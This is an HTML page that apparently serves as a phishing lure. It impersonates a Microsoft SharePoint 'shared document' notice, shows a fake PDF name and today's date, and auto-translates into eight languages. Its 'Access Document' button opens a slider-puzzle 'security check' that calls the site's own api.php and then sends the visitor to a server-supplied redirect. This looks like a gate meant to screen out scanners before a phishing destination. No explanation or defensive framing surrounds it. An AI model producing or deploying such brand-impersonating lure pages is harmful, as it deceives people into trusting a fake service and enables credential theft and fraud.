<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shared Document</title>
    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/1/1c/ICloud_logo.svg" type="image/svg+xml">
    <style>
        :root {
            --brand-primary: #038387;
            --brand-hover: #026D70;
            --white: #ffffff;
            --bg-grey: #f5f5f5;
            --text-main: #1b1b1b;
            --text-sub: #616161;
        }

        * { box-sizing: border-box; margin: 0; padding: 0; }

        body {
            font-family: "Segoe UI", -apple-system, system-ui, BlinkMacSystemFont, Roboto, "Helvetica Neue", Arial, sans-serif;
            background-color: #eaf3f5;
            background-image: 
                radial-gradient(circle at 10% 10%, rgba(3, 131, 135, 0.35) 0%, transparent 60%), 
                radial-gradient(circle at 90% 90%, rgba(0, 120, 212, 0.28) 0%, transparent 60%),
                radial-gradient(circle at 70% 20%, rgba(135, 100, 184, 0.18) 0%, transparent 50%);
            background-attachment: fixed;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .auth-card {
            background: var(--white);
            width: 420px;
            border-radius: 6px;
            padding: 40px 44px;
            box-shadow: 0 6px 30px rgba(0,0,0,0.1), 0 1px 4px rgba(0,0,0,0.06);
            text-align: center;
            border: 1px solid rgba(0,0,0,0.05);
            border-top: 4px solid var(--brand-primary);
            animation: cardIn 0.5s cubic-bezier(0.16,1,0.3,1) forwards;
            opacity: 0;
        }
        @keyframes cardIn {
            0% { opacity:0; transform:translateY(18px); }
            100% { opacity:1; transform:translateY(0); }
        }

        .brand-logo { width:64px; height:64px; object-fit:contain; margin-bottom:8px; }
        .sp-wordmark { font-size:18px; font-weight:600; color:#1b1b1b; margin-bottom:20px; }
        .sp-wordmark span { color:var(--brand-primary); }
        
        .file-info {
            background:#f0fafa; border:1px solid #d0eded; border-radius:8px;
            padding:14px 18px; margin-bottom:20px;
            display:flex; align-items:center; gap:12px;
            transition: border-color 0.25s, box-shadow 0.25s;
        }
        .file-info:hover { border-color:var(--brand-primary); box-shadow:0 0 0 1px var(--brand-primary); }
        .file-icon { width:36px; height:36px; flex-shrink:0; }
        .file-details { text-align:left; }
        .file-name { font-size:13.5px; font-weight:600; color:var(--text-main); }
        .file-meta { font-size:12px; color:var(--text-sub); margin-top:2px; }
        .subtext { font-size:14px; color:var(--text-sub); margin-bottom:24px; line-height:1.5; }

        .cta-button {
            display:inline-block; background-color:var(--brand-primary); color:white !important;
            text-decoration:none; padding:12px 32px; font-size:15px; font-weight:600;
            border-radius:4px; border:none; width:100%; cursor:pointer;
            transition: background-color 0.2s, box-shadow 0.2s, transform 0.12s;
            box-shadow: 0 2px 6px rgba(3,131,135,0.15);
        }
        .cta-button:hover { background-color:var(--brand-hover); box-shadow:0 4px 14px rgba(3,131,135,0.28); transform:translateY(-1px); }
        .cta-button:active { transform:translateY(0) scale(0.99); }

        .footer-note {
            margin-top:20px; font-size:12px; color:var(--text-sub);
            border-top:1px solid #f0f0f0; padding-top:16px;
        }

        .captcha-overlay {
            position:fixed; top:0; left:0; width:100%; height:100%;
            background:rgba(0,0,0,0.45);
            display:flex; align-items:center; justify-content:center;
            z-index:10000;
            opacity:0; visibility:hidden; transition: opacity 0.25s, visibility 0.25s;
        }
        .captcha-overlay.active { opacity:1; visibility:visible; }

        .captcha-card {
            background:white; width:380px; border-radius:8px;
            padding:32px 28px; box-shadow:0 12px 40px rgba(0,0,0,0.2);
            text-align:center; border-top:4px solid var(--brand-primary);
            transform:translateY(20px) scale(0.97);
            transition: transform 0.3s cubic-bezier(0.16,1,0.3,1), opacity 0.3s;
            opacity:0;
        }
        .captcha-overlay.active .captcha-card { transform:translateY(0) scale(1); opacity:1; }

        .captcha-title { font-size:18px; font-weight:600; color:var(--text-main); margin-bottom:6px; }
        .captcha-subtitle { font-size:13px; color:var(--text-sub); margin-bottom:24px; line-height:1.5; }

        .puzzle-container {
            position:relative; width:300px; height:150px;
            margin:0 auto 20px auto; background:#e4e6e9;
            border-radius:6px; overflow:hidden;
            box-shadow: inset 0 2px 4px rgba(0,0,0,0.05);
        }
        #bg-canvas { position:absolute; top:0; left:0; z-index:1; }
        #piece-canvas {
            position:absolute; top:0; left:0; z-index:2;
            filter: drop-shadow(0 3px 6px rgba(0,0,0,0.35));
        }

        .slider-container { position:relative; width:300px; margin:0 auto; }
        .slider-track {
            background:#f3f2f1; height:44px; position:relative;
            border:1px solid #a19f9d; border-radius:22px;
        }
        .slider-fill {
            background:rgba(3,131,135,0.1); height:44px; width:0;
            position:absolute; top:-1px; left:-1px; z-index:1;
            border-radius:22px 0 0 22px; border:1px solid var(--brand-primary);
            opacity:0;
        }
        .slider-handle {
            width:44px; height:44px; background:#fff; color:var(--brand-primary);
            border:1px solid var(--brand-primary); box-shadow:0 2px 4px rgba(0,0,0,0.1);
            position:absolute; top:-1px; left:-1px; cursor:grab;
            display:flex; justify-content:center; align-items:center;
            z-index:3; border-radius:50%;
            transition: background 0.2s, color 0.2s;
        }
        .slider-handle:hover { background:#f3f9ff; }
        .slider-handle.active { background:var(--brand-primary); color:#fff; cursor:grabbing; }

        .error-popup {
            position:absolute; top:-46px; left:50%; transform:translateX(-50%);
            background:#d13438; color:#fff; padding:8px 14px; font-size:13px;
            border-radius:4px; box-shadow:0 4px 12px rgba(0,0,0,0.2);
            z-index:10; opacity:0; pointer-events:none; white-space:nowrap;
            transition: opacity 0.3s;
        }
        .error-popup::after {
            content:''; position:absolute; bottom:-5px; left:50%; transform:translateX(-50%);
            border-width:5px 5px 0; border-style:solid;
            border-color:#d13438 transparent transparent transparent;
        }
        .error-popup.visible { opacity:1; }

        .puzzle-loading {
            position:absolute; top:0; left:0; right:0; bottom:0;
            background:rgba(255,255,255,0.85);
            display:flex; flex-direction:column;
            align-items:center; justify-content:center; z-index:100;
        }
        .puzzle-loading.hidden { display:none; }
        .puzzle-spinner {
            width:28px; height:28px;
            border:3px solid #e8e8e8; border-top-color:var(--brand-primary);
            border-radius:50%; animation:spin 0.7s linear infinite;
            margin-bottom:8px;
        }
        .puzzle-loading p { font-size:12px; color:var(--text-sub); }
        @keyframes spin { to { transform:rotate(360deg); } }

        .shake { animation: shake 0.4s cubic-bezier(.36,.07,.19,.97) both; }
        @keyframes shake {
            10%,90% { transform:translate3d(-1px,0,0); }
            20%,80% { transform:translate3d(2px,0,0); }
            30%,50%,70% { transform:translate3d(-4px,0,0); }
            40%,60% { transform:translate3d(4px,0,0); }
        }
    </style>
</head>
<body>

    <div class="auth-card">
        <img class="brand-logo" src="https://upload.wikimedia.org/wikipedia/commons/2/28/Microsoft_Office_SharePoint_%282025%E2%80%93present%29.svg" alt="SharePoint">
        <div class="sp-wordmark">Share<span>Point</span></div>
        <div class="file-info">
            <svg class="file-icon" viewBox="0 0 36 36" xmlns="http://www.w3.org/2000/svg">
                <rect x="4" y="2" width="28" height="32" rx="3" fill="#f0fafa" stroke="#038387" stroke-width="1.5"/>
                <line x1="10" y1="12" x2="26" y2="12" stroke="#038387" stroke-width="1.5" opacity="0.4"/>
                <line x1="10" y1="18" x2="26" y2="18" stroke="#038387" stroke-width="1.5" opacity="0.4"/>
                <line x1="10" y1="24" x2="20" y2="24" stroke="#038387" stroke-width="1.5" opacity="0.4"/>
            </svg>
            <div class="file-details">
                <div class="file-name">EPCI-Project-88209.pdf</div>
                <div class="file-meta">248 KB &bull; <span id="currentDate">May 21, 2026</span></div>
            </div>
        </div>
        <p class="subtext" id="subtext">A document has been shared with you via SharePoint. Only authorized recipients can access this document.</p>
        <button class="cta-button" id="accessBtn">Access Document</button>
        <div class="footer-note" id="footerNote">This document is protected by SharePoint security.</div>
    </div>

    <div class="captcha-overlay" id="captchaOverlay">
        <div class="captcha-card">
            <div class="captcha-title" id="captchaTitle">Quick security check</div>
            <div class="captcha-subtitle" id="captchaSubtitle">To continue, please solve this puzzle so we know you're a real person.</div>

            <div class="puzzle-container" id="puzzle-container">
                <div class="puzzle-loading" id="puzzle-loading">
                    <div class="puzzle-spinner"></div>
                    <p>Loading...</p>
                </div>
                <canvas id="bg-canvas" width="300" height="150"></canvas>
                <canvas id="piece-canvas" width="50" height="50"></canvas>
            </div>

            <div class="slider-container">
                <div class="error-popup" id="error-popup">Incorrect position. Try again.</div>
                <div class="slider-track" id="slider-track">
                    <div class="slider-fill" id="slider-fill"></div>
                    <div class="slider-handle" id="slider-handle">
                        <svg viewBox="0 0 24 24" width="18" height="18" fill="currentColor">
                            <path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/>
                        </svg>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
    (function() {
        const dateEl = document.getElementById('currentDate');
        const options = { year: 'numeric', month: 'long', day: 'numeric', timeZone: 'Europe/Berlin' };
        let today = new Date().toLocaleDateString('en-US', options);
        dateEl.textContent = today;

        const translations = {
            'es': {
                subtext: 'Se ha compartido un documento contigo a través de SharePoint. Solo los destinatarios autorizados pueden acceder a este documento.',
                accessBtn: 'Acceder al Documento',
                footerNote: 'Este documento está protegido por la seguridad de SharePoint.',
                captchaTitle: 'Verificación de seguridad rápida',
                captchaSubtitle: 'Para continuar, resuelve este rompecabezas para saber que eres una persona real.'
            },
            'de': {
                subtext: 'Ein Dokument wurde über SharePoint für Sie freigegeben. Nur autorisierte Empfänger können auf dieses Dokument zugreifen.',
                accessBtn: 'Dokument aufrufen',
                footerNote: 'Dieses Dokument ist durch SharePoint-Sicherheit geschützt.',
                captchaTitle: 'Schnelle Sicherheitsüberprüfung',
                captchaSubtitle: 'Bitte lösen Sie dieses Rätsel, um fortzufahren.'
            },
            'fr': {
                subtext: 'Un document a été partagé avec vous via SharePoint. Seuls les destinataires autorisés peuvent y accéder.',
                accessBtn: 'Accéder au document',
                footerNote: 'Ce document est protégé par la sécurité SharePoint.',
                captchaTitle: 'Vérification de sécurité',
                captchaSubtitle: 'Pour continuer, veuillez résoudre ce puzzle pour prouver que vous êtes une vraie personne.'
            },
            'it': {
                subtext: 'Un documento è stato condiviso con te tramite SharePoint. Solo i destinatari autorizzati possono accedervi.',
                accessBtn: 'Accedi al documento',
                footerNote: 'Questo documento è protetto dalla sicurezza di SharePoint.',
                captchaTitle: 'Controllo di sicurezza rapido',
                captchaSubtitle: 'Per continuare, risolvi questo puzzle per confermare che sei una persona reale.'
            },
            'ar': {
                subtext: 'تمت مشاركة مستند معك عبر SharePoint. يمكن فقط للمستلمين المعتمدين الوصول إلى هذا المستند.',
                accessBtn: 'الوصول إلى المستند',
                footerNote: 'هذا المستند محمي بواسطة أمان SharePoint.',
                captchaTitle: 'فحص أمني سريع',
                captchaSubtitle: 'للمتابعة، يرجى حل هذا اللغز لنعرف أنك شخص حقيقي.'
            },
            'nl': {
                subtext: 'Er is een document met u gedeeld via SharePoint. Alleen geautoriseerde ontvangers hebben toegang tot dit document.',
                accessBtn: 'Document openen',
                footerNote: 'Dit document is beveiligd door SharePoint-beveiliging.',
                captchaTitle: 'Snelle beveiligingscontrole',
                captchaSubtitle: 'Los deze puzzel op om door te gaan, zodat we weten dat u een echt persoon bent.'
            },
            'pt': {
                subtext: 'Um documento foi compartilhado com você via SharePoint. Apenas destinatários autorizados podem acessar este documento.',
                accessBtn: 'Acessar Documento',
                footerNote: 'Este documento é protegido pela segurança do SharePoint.',
                captchaTitle: 'Verificação de segurança rápida',
                captchaSubtitle: 'Para continuar, resolva este quebra-cabeça para sabermos que você é uma pessoa real.'
            },
            'zh': {
                subtext: '已通过 SharePoint 与您共享了一份文档。只有经过授权的收件人才能访问此文档。',
                accessBtn: '访问文档',
                footerNote: '此文档受 SharePoint 安全保护。',
                captchaTitle: '快速安全检查',
                captchaSubtitle: '为了继续，请解决此谜题，以便我们知道您是真人。'
            }
        };

        const lang = (navigator.language || navigator.userLanguage).substring(0, 2).toLowerCase();
        if (translations[lang]) {
            if (lang === 'ar') {
                document.documentElement.setAttribute('dir', 'rtl');
            }
            
            document.getElementById('subtext').textContent = translations[lang].subtext;
            document.getElementById('accessBtn').textContent = translations[lang].accessBtn;
            document.getElementById('footerNote').textContent = translations[lang].footerNote;
            document.getElementById('captchaTitle').textContent = translations[lang].captchaTitle;
            document.getElementById('captchaSubtitle').textContent = translations[lang].captchaSubtitle;
            
            try {
                today = new Date().toLocaleDateString(navigator.language, options);
                dateEl.textContent = today;
            } catch (e) {}
        }

        const overlay      = document.getElementById('captchaOverlay');
        const handle       = document.getElementById('slider-handle');
        const track        = document.getElementById('slider-track');
        const fill         = document.getElementById('slider-fill');
        const bgCanvas     = document.getElementById('bg-canvas');
        const pieceCanvas  = document.getElementById('piece-canvas');
        const loadingEl    = document.getElementById('puzzle-loading');
        const errorPopup   = document.getElementById('error-popup');

        let isDragging = false, startX = 0, currentTranslate = 0;
        let trackWidth, handleWidth, maxTranslate;
        let challengeToken = '';

        const basePath = '/';

        function loadImage(canvas, base64) {
            return new Promise(function(resolve, reject) {
                var img = new Image();
                img.onload = function() {
                    var ctx = canvas.getContext('2d');
                    ctx.clearRect(0, 0, canvas.width, canvas.height);
                    ctx.drawImage(img, 0, 0);
                    resolve();
                };
                img.onerror = reject;
                img.src = base64;
            });
        }

        function measureTrack() {
            trackWidth   = track.offsetWidth;
            handleWidth  = handle.offsetWidth;
            maxTranslate = trackWidth - handleWidth;
        }

        async function loadChallenge() {
            loadingEl.classList.remove('hidden');
            try {
                var res  = await fetch(basePath + 'api.php?action=challenge');
                var data = await res.json();
                if (data.error) { alert(data.error); return; }
                await Promise.all([
                    loadImage(bgCanvas, data.bg_image),
                    loadImage(pieceCanvas, data.piece_image)
                ]);
                pieceCanvas.style.top = data.piece_y + 'px';
                challengeToken = data.token;
                measureTrack();
            } catch(e) {
                alert('Could not load puzzle. Please refresh.');
            } finally {
                loadingEl.classList.add('hidden');
            }
        }

        document.getElementById('accessBtn').addEventListener('click', function() {
            overlay.classList.add('active');
            loadChallenge();
        });

        overlay.addEventListener('click', function(e) {
            if (e.target === overlay) {
                overlay.classList.remove('active');
                resetSlider();
            }
        });

        function onDragStart(e) {
            if (isDragging || !challengeToken) return;
            isDragging = true;
            handle.style.transition = 'none';
            fill.style.transition   = 'none';
            pieceCanvas.style.transition = 'none';
            startX = (e.touches ? e.touches[0].clientX : e.clientX) - currentTranslate;
            handle.classList.add('active');
        }

        function onDragMove(e) {
            if (!isDragging) return;
            var cx = e.touches ? e.touches[0].clientX : e.clientX;
            var t  = cx - startX;
            if (t < 0) t = 0;
            if (t > maxTranslate) t = maxTranslate;
            currentTranslate = t;
            requestAnimationFrame(function() {
                handle.style.transform = 'translateX(' + t + 'px)';
                fill.style.width   = (t + 8) + 'px';
                fill.style.opacity = t > 0 ? '1' : '0';
                var bgMax = bgCanvas.width - pieceCanvas.width;
                pieceCanvas.style.transform = 'translateX(' + (t / maxTranslate * bgMax) + 'px)';
            });
        }

        async function onDragEnd() {
            if (!isDragging) return;
            isDragging = false;
            handle.classList.remove('active');
            handle.style.pointerEvents = 'none';

            var bgMax  = bgCanvas.width - pieceCanvas.width;
            var pieceX = Math.round((currentTranslate / maxTranslate) * bgMax);

            loadingEl.querySelector('p').textContent = 'Verifying...';
            loadingEl.classList.remove('hidden');

            try {
                var res  = await fetch(basePath + 'api.php?action=verify', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ slider_x: pieceX, token: challengeToken })
                });
                var data = await res.json();
                loadingEl.classList.add('hidden');

                if (data.status === 'success') {
                    window.location.href = data.redirect;
                } else {
                    showError(data.message || 'Incorrect position. Try again.');
                    setTimeout(resetSlider, 1200);
                }
            } catch(e) {
                loadingEl.classList.add('hidden');
                showError('Network error. Try again.');
                setTimeout(resetSlider, 1200);
            }
        }

        function showError(msg) {
            errorPopup.textContent = msg;
            errorPopup.classList.add('visible');
            handle.classList.add('shake');
        }

        function resetSlider() {
            handle.style.transition      = 'transform 0.3s ease';
            fill.style.transition        = 'width 0.3s ease';
            pieceCanvas.style.transition = 'transform 0.3s ease';
            currentTranslate = 0;
            handle.style.transform      = 'translateX(0)';
            fill.style.width            = '0';
            fill.style.opacity          = '0';
            pieceCanvas.style.transform = 'translateX(0)';
            handle.style.pointerEvents  = 'auto';
            errorPopup.classList.remove('visible');
            handle.classList.remove('shake');
            setTimeout(loadChallenge, 300);
        }

        handle.addEventListener('mousedown', onDragStart);
        document.addEventListener('mousemove', onDragMove);
        document.addEventListener('mouseup', onDragEnd);
        handle.addEventListener('touchstart', onDragStart, {passive:false});
        document.addEventListener('touchmove', onDragMove, {passive:false});
        document.addEventListener('touchend', onDragEnd);
    })();
    </script>

</body>
</html>
